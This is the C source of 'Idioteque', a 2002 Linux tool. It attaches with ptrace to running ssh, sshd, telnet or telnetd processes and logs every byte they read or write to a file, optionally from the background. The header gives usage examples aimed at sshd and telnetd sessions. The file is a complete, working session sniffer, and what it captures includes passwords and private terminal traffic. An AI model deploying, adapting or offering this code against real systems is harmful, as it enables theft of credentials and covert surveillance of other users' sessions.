/*
 *
 * $Id: smokingtwojoints.c,v 0.2.public 2002/08/18 1:08:06 xenion Exp $
 *
 * ---------------------------------------------------------------------------
 * No part of this project may be used to break the law, or to cause damage of
 * any kind. And I'm not responsible for anything you do with it.
 * ---------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
 * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
 * you can do whatever you want with this stuff. If we meet some day, and you
 * think this stuff is worth it, you can buy me a beer in return.
 * xenion ~ Dallachiesa Michele
 * ---------------------------------------------------------------------------
 */

/*
you can log ssh/telnet sessions (and sshd/telnetd childs..) using ptrace(2)

examples (try to change fd(s) if they won't work!):

ssh:        ./idioteque -p PID -d 5
sshd:       ./idioteque -p PID -d 7
in.telnetd: ./idioteque -p PID -d 0
telnet:     ./idioteque -p PID -d 1

greetz: darkangel
*/


#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <linux/user.h>
#include <signal.h>
#include <asm/unistd.h>
#include <dirent.h>
#include <errno.h>
#include <limits.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>

#define VERSION "0.2.public"

void            fatal(char *, ...);
void            init_opt(int, char **);
void            help();
void            sigdie(int);
void           *ttmemcpy(pid_t, unsigned char *, unsigned char *, size_t);
size_t          getmytime(char *, size_t, const char *);
void            printstatus(const char *format, ...);
int            *get_coma_options(unsigned char *);
int             pidexists(pid_t);

typedef struct {
    pid_t           pid;
    int             status,
                    mode,
                   *fds;
    int             background;
    FILE           *lfile;
    FILE           *sfile;
} OPT;

OPT             o;


int
main(int argc, char **argv)
{
    struct user_regs_struct data;
    unsigned char   buf[4096];
    int             i;

    init_opt(argc, argv);

    if (o.background)
	if (fork())
	    exit(0);

    printstatus("pid         : %d %s\n", getpid(),
		o.background ? "(Running in background)" : "");
    printstatus("ptraced pid : %d\n", o.pid);
    printstatus("fds         :%s", o.fds ? "" : " ALL");
    if (o.fds)
	for (i = 1; i < *o.fds; ++i)
	    fprintf(o.sfile, " %d", *(o.fds + i));
    fprintf(o.sfile, "\n");
    printstatus("\n");
    fflush(o.sfile);

    signal(SIGTERM, sigdie);
    signal(SIGINT, sigdie);
    signal(SIGQUIT, sigdie);
    signal(SIGHUP, sigdie);
    signal(SIGSEGV, sigdie);
    signal(SIGURG, SIG_IGN);

    if (ptrace(PTRACE_ATTACH, o.pid, 0, 0) < 0) {
	o.pid = 0;
	fatal("PTRACE_ATTACH failed");
    }

    o.mode = 1;
    printstatus("Listening..\n\n");

    while (1) {

	if (ptrace(PTRACE_SYSCALL, o.pid, 0, 0) < 0)
	    fatal("PTRACE_SYSCALL failed");

	wait(&o.status);

	if (WSTOPSIG(o.status) != SIGTRAP) {
	    printstatus("Sending signal %d\n", WSTOPSIG(o.status));
	    ptrace(PTRACE_SYSCALL, o.pid, 0, WSTOPSIG(o.status));
	}

	switch (o.mode) {

	case 1:
	    o.mode = 2;
	    // if (ptrace(PTRACE_GETREGS, o.pid, &data, &data) < 0)
	    // fatal("PTRACE_GETREGS failed");

	    // printf("started:\n");
	    // printf("eax: %8lx orig_eax: %8lx\n", data.eax,
	    // data.orig_eax);
	    // printf("ebx: %8lx ecx: %8lx\n", data.ebx, data.ecx);
	    // printf("edx: %8lx\n\n", data.edx);

	    break;

	case 2:
	    if (ptrace(PTRACE_GETREGS, o.pid, &data, &data) < 0)
		fatal("PTRACE_GETREGS failed");

	    // printf("returned:\n");
	    // printf("eax: %8lx orig_eax: %8lx\n", data.eax,
	    // data.orig_eax);
	    // printf("ebx: %8lx ecx: %8lx\n", data.ebx, data.ecx);
	    // printf("edx: %8lx\n\n", data.edx);

	    if (o.fds) {
		for (i = 1; i < *o.fds; ++i)
		    if (*(o.fds + i) == data.ebx)
			o.mode = 3;
	    } else
		o.mode = 3;

	    memset(buf, '\0', sizeof buf);

	    if ((data.orig_eax == __NR_read || data.orig_eax == __NR_write)
		&& o.mode == 3 && data.eax > 0) {
		if (ttmemcpy
		    (o.pid, buf, (unsigned char *) data.ecx,
		     data.eax) == NULL)
		    fatal("ttmemcpy()");
		buf[data.eax] = '\0';
		fprintf(o.lfile, "%s", buf);
		fflush(o.lfile);
	    }

	    o.mode = 1;
	    break;

	default:
	    fatal("Oops");
	    break;
	}

    }

    return 0;
}


void
init_opt(int argc, char **argv)
{
    int             c;

    o.pid = 0;
    o.fds = NULL;
    o.background = 0;
    o.sfile = o.lfile = stdout;

    while ((c = getopt(argc, argv, "p:d:s:l:bh")) != EOF)
	switch (c) {

	case 'p':
	    if ((o.pid = atoi(optarg)) == 0)
		fatal("Invalid process id");
	    if (!pidexists(o.pid)) {
		o.pid = 0;
		fatal("No such process");
	    }

	    break;

	case 'd':
	    o.fds = get_coma_options(optarg);
	    break;

	case 's':
	    o.sfile = fopen(optarg, "w");
	    if (o.sfile == NULL) {
		o.sfile = stdout;
		fatal("unable to open status file");
	    }
	    break;

	case 'l':
	    o.lfile = fopen(optarg, "w");
	    if (o.lfile == NULL)
		fatal("unable to open log file");
	    break;

	case 'b':
	    o.background = 1;
	    break;

	case 'h':
	    help();
	    break;

	default:
	    fatal("try -h");
	}

    if (o.pid == 0)
	fatal("pid needed");
}


void
fatal(char *pattern, ...)
{

    char            timebuf[20];
    va_list         ap;

    va_start(ap, pattern);
    getmytime(timebuf, 20, "%d/%m/%y#%H:%M:%S");
    fprintf(o.sfile, "%s ", timebuf);
    vfprintf(o.sfile, pattern, ap);
    fprintf(o.sfile, "; exit forced.\n");
    va_end(ap);

    if (o.fds)
	free(o.fds);
    if (o.pid == 0)
	exit(0);

    sigdie(SIGTERM);
}


int            *
get_coma_options(unsigned char *s)
{
    unsigned char  *p,
                   *e;
    int            *arr;
    int             c;

    arr = malloc(sizeof(int));	// no. of entries

    for (p = s, *arr = 1; *p; ++*arr) {
	if ((e = index(p, (int) ',')) == NULL)
	    e = index(p, (int) '\0');
	c = *e;
	*e = '\0';
	realloc(arr, *arr * sizeof(int) + 1);
	*(arr + *arr) = atoi(p);
	*e = c;

	if (*arr == INT_MAX)
	    break;
	p = c ? ++e : e;
    }
    return arr;
}


void
help()
{
    printf("Idioteque v%s\n\n", VERSION);
    printf("USAGE: idioteque [options]\n\n");
    printf("-p pid                              pid to be traced\n");
    printf("-d fd1,fd2,fd3,..                   fd(s) to be logged\n");
    printf("-b                                  Run in background\n");
    printf("-s                                  Status file\n");
    printf("-l                                  fd(s) log file\n");
    printf("\n");

    exit(0);
}


void
sigdie(int signo)
{
    int             pid;

    if (o.sfile == o.lfile && o.pid > 0)
	fprintf(o.sfile, "\n");

    switch (signo) {
    case SIGURG:
	printstatus("caught SIGURG signal, cleaning up\n");
	break;
    case SIGPIPE:
	printstatus("caught SIGPIPE signal, cleaning up\n");
	break;
    case SIGQUIT:
	printstatus("caught SIGQUIT signal, cleaning up\n");
	break;
    case SIGINT:
	printstatus("caught SIGINT signal, cleaning up\n");
	break;
    case SIGTERM:
	printstatus("caught SIGTERM signal, cleaning up\n");
	break;
    case SIGHUP:
	printstatus("caught SIGHUP signal, cleaning up\n");
	break;
    case SIGSEGV:
	printstatus("caught SIGSEGV signal, cleaning up\n");
	break;
    case SIGBUS:
	printstatus("caught SIGBUS signal, cleaning up\n");
	break;
    default:
	printstatus("caught signal %d, cleaning up\n", signo);
	break;
    }

    if (o.pid != 0) {

	switch (pid = fork()) {

	case -1:
	    fatal("fork()");
	    break;

	case 0:		/* child process starts */
	    printstatus
		("sending a SIGCONT signal to the ptraced process\n");
	    if (kill(o.pid, SIGCONT) < 0) {
		o.pid = 0;
		fatal("kill()");
	    }
	    break;

	default:		/* parent process starts */
	    wait(&o.status);
	    if (ptrace(PTRACE_DETACH, o.pid, 0, 0) < 0)
		printstatus("PTRACE_DETACH failed\n", o.pid);
	    printstatus("exited: %s\n", strerror(errno));
	    break;

	}

    }

    exit(0);

}


void           *
ttmemcpy(pid_t pid, unsigned char *dest, unsigned char *src, size_t count)
{
    size_t          off;
    long int        res;

    for (off = 0; off < count; off += sizeof(long int)) {
	res = ptrace(PTRACE_PEEKTEXT, pid, src + off, 0);
	if (errno > 0)
	    return NULL;
	else {
	    memcpy(dest + off, &res, sizeof(long int));
	    // printf("[%c][%c]", *(dest + off), *(dest + off + 1));
	    // printf("[%c][%c]\n", *(dest + off + 2), *(dest + off + 3));
	}
    }

    return dest;
}


void
printstatus(const char *format, ...)
{

    char            timebuf[20];

    va_list         ap;
    va_start(ap, format);

    getmytime(timebuf, 20, "%d/%m/%y#%H:%M:%S");

    fprintf(o.sfile, "%s ", timebuf);
    vfprintf(o.sfile, format, ap);
    fflush(o.sfile);

    va_end(ap);

}


size_t
getmytime(char *s, size_t max, const char *format)
{

    time_t          t;
    struct tm      *mytm;
    size_t          z;

    time(&t);

    mytm = localtime(&t);

    z = strftime(s, max, format, mytm);

    return (z);

}


int
pidexists(pid_t pid)
{
    struct stat     buf;
    char            path[12];

    sprintf(path, "/proc/%d", pid);

    if (stat(path, &buf) < 0)
	return 0;
    return 1;

}

/*
 * this is the place for a little EOF 
 */
